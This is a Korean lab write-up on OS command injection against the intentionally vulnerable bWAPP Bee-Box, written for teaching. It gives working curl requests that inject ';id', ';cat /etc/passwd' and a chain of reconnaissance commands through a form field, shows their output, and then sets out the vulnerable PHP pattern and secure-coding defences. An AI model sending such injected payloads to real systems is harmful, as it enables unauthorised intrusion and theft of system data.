# 웹 해킹 실습 교육: OS Command Injection

> **교육 목적 전용 (For Educational Purposes Only)**  
> 본 문서는 bWAPP(Bee-Box) 취약점 실습 환경을 대상으로 작성되었습니다.  
> 허가 없이 타인의 시스템에 적용하는 것은 불법입니다.

---

## 📋 실습 환경 정보

| 항목 | 내용 |
|------|------|
| **대상 서버** | `192.168.0.20` (bWAPP Bee-Box) |
| **공격자 서버** | `192.168.0.146` (Kali Linux) |
| **실습 URL** | `http://192.168.0.20/bWAPP/commandi.php` |
| **계정 정보** | `bee / bug` |
| **보안 레벨** | Low (Security Level: 0) |
| **실습 일시** | 2026-04-20 |

---

## 🎯 취약점 개요

### OS Command Injection이란?

웹 애플리케이션이 시스템 명령어(OS Command)를 호출하여 실행할 때, 사용자로부터 입력받은 값을 적절한 필터링 없이 쉘 커맨드의 일부로 전달할 때 발생하는 치명적인 서버 측 취약점입니다.

공격자는 정상적인 입력값 뒤에 쉘(Shell) 명령어 구분자(예: `;`, `&&`, `||`, `|` 등)를 덧붙여 **의도하지 않은 악의적인 시스템 명령을 이어서 실행**하도록 조작할 수 있습니다. 이를 통해 서버 환경 정보를 탈취하거나, 리버스 쉘(Reverse Shell)을 열어 대상 서버를 완전히 장악할 수 있습니다.

이번 실습 페이지 `commandi.php`는 주어진 도메인명(또는 IP)의 DNS 정보나 통신상태를 조회하기 위해 운영체제의 명령어(ex. `nslookup` 또는 `ping`)를 내부적으로 호출하는 것으로 추정되며, 이때 명령어 인젝션이 통하는지 실습할 수 있습니다.

### OWASP Top 10 분류
- **A03:2021** – Injection

---

## 🔍 공격 흐름 다이어그램

```
[공격자 (Kali Linux)]
        │
        ▼
[1단계] 취약점 페이지 (commandi.php) 분석
        (DNS Lookup 입력 폼(target) 캡처 및 필드 구조 파악)
        │
        ▼
[2단계] 명령어 다중 실행 연산자(;) 테스트
        (정상 IP 뒷단에 `;` 구분자를 넣고 `id` 명령어 추가 전송)
        │
        ▼
[3단계] 단일 시스템 정보(명령 결과) 탈취 확인
        (세미콜론 뒷단의 id 커맨드가 병합 실행되어 화면에 출력)
        │
        ▼
[4단계] 복합 시스템 정보 탈취 및 운영체제 접근
        (네트워크 정보, 사용자 해시(/etc/passwd) 등 다중 명령 실행)
```

---

## 🛠️ 단계별 실습 (실제 실행 명령어)

### Step 1: 세미콜론(`;`) 구분자를 활용한 인젝션 시도

쉘에서 `;`는 앞선 명령이 끝나면 뒤의 명령을 연달아 실행하라는 지시자입니다. 정상 IP 주소와 함께 `;id`를 삽입하여 OS 커맨드 인젝션 취약점이 존재하는지 확인합니다.

```bash
# DNS Target 값에 127.0.0.1;id 전달
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -c /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST \
     -d "target=127.0.0.1;id&form=submit" \
     "http://192.168.0.20/bWAPP/commandi.php" | grep -i -A 10 "<p align=\"left\">"
```

**실행 결과:**
```html
<p align="left">Server:         1.214.68.2
Address:        1.214.68.2#53

1.0.0.127.in-addr.arpa  name = localhost.

uid=33(www-data) gid=33(www-data) groups=33(www-data)
</p>
```

> 💡 **분석 포인트**: 서버는 내부적으로 `nslookup 127.0.0.1;id` 와 같이 쉘로 전달했습니다. 그 결과 `nslookup` 명령이 먼저 수행되고 이어서 `id` 명령이 실행되어 현 프로세스 계정인 `www-data` 정보가 유출되었습니다.

---

### Step 2: 리눅스 주요 시스템 파일(passwd) 탈취

인젝션이 확인되었으므로, 파일 내용을 열어보는 `cat` 명령어를 묶어 시스템 내부 구조를 파악해 봅니다.

```bash
# 운영체제 민감 파일 탈취 (cat /etc/passwd)
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -c /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST \
     -d "target=127.0.0.1;cat /etc/passwd&form=submit" \
     "http://192.168.0.20/bWAPP/commandi.php" | grep -i -A 30 "<p align=\"left\">" | head -n 15
```

**실행 결과:**
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...
www-data:x:33:33:www-data:/var/www:/bin/sh
```

---

### Step 3: 복합(Multiple) 시스템 정보 일괄 추출

커맨드 사이사이에 `;` 를 연속으로 이어 붙이면 한 번의 요청만으로 서버의 운영체제 정보, 활성 포트 내역(오픈된 데몬), 현재 실행 디렉토리 경로 등을 일거에 뽑아낼 수 있습니다.

```bash
# 다중 명령어 실행 (uname -a; id; netstat -tulpn; pwd)
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -c /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST \
     -d "target=127.0.0.1;uname -a;id;netstat -tulpn;pwd&form=submit" \
     "http://192.168.0.20/bWAPP/commandi.php" | grep -i -A 30 "<p align=\"left\">"
```

**실행 결과:**
```text
Linux bee-box 2.6.24-16-generic #1 SMP Thu Apr 10 13:23:42 UTC 2008 i686 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -               
...
/var/www/bWAPP
```

---

## 📊 탈취 정보 요약

| 정보 유형 | 탈취된 데이터 내용 |
|-----------|------------------|
| **커널 버전** | `Linux bee-box 2.6.24-16-generic` |
| **실행 프로세스** | `www-data` 웹 권한 |
| **실행 디렉토리** | `/var/www/bWAPP` |
| **운영체제 파일** | `/etc/passwd` 정보 전체 조회 완료 |
| **내부 네트워크** | `netstat`를 통해 내부에서 구동중인 DB(3306), FTP(21), SMB(139) 등 서비스 포트 식별 완료 |

---

## 🛡️ 취약점 발생 원인 및 방어 기법

### 취약점 발생 메커니즘
서버 측 언어(PHP, Python, Node.js 등)에서 `system()`, `exec()`, `shell_exec()`, `popen()` 류의 함수를 사용할 때, 사용자 입력값을 적절히 가공하지 않고 실행 명령 파라미터로 결합했기 때문입니다.
```php
// 취약한 패턴의 예시
$target = $_POST["target"];
// 필터링 없이 그대로 쉘로 넘어감
shell_exec("nslookup " . $target);
```

### 방어(Secure Coding) 가이드

1. **명령어 실행 함수 사용 자제 (최선의 방어)**
   가능하면 OS 명령어 쉘을 직접 호출하는 함수(`system()` 등)를 사용하지 않고 언어 자체 내장 API나 모듈(예: PHP의 `gethostbyname()`, `dns_get_record()`)을 사용하는 것이 가장 강력한 예방입니다.

2. **사용자 입력값 필터링 및 검증 (White-List)**
   부득이하게 써야 할 경우, 정규표현식(Regex)을 이용해 입력값이 정상적인 IP 주소 형태인지, 숫자나 영문자 외에 `;`, `|`, `&`, `$`, `` ` `` 같은 쉘 예약 특수기호가 있는지를 사전에 차단해야 합니다.

3. **명령어 매개변수 이스케이프 ⭐️**
   PHP의 경우 `escapeshellcmd()` 나 `escapeshellarg()` 내장 함수를 제공하여, 입력된 문자열 전체를 단일 문자열 인수 포맷으로 강제 이스케이프 처리함으로써 추가 명령어 삽입을 끊어낼 수 있습니다.

---

## ⚖️ 법적 고지

> 이 문서의 모든 기법은 **bWAPP(Bee-Box)** 의도적 취약 환경에서  
> **교육 목적**으로만 수행되었습니다.  
> 허가받지 않은 환경에 해당 기술을 활용할 경우 **심각한 불법 행위**로 간주됩니다.
> 반드시 본인 소유 또는 적법한 동의를 얻은 환경 내에서 활용하십시오.

---

*작성일: 2026-04-20 | 실습 환경: Kali Linux + bWAPP Bee-Box | 작성: ngnicky-ai*
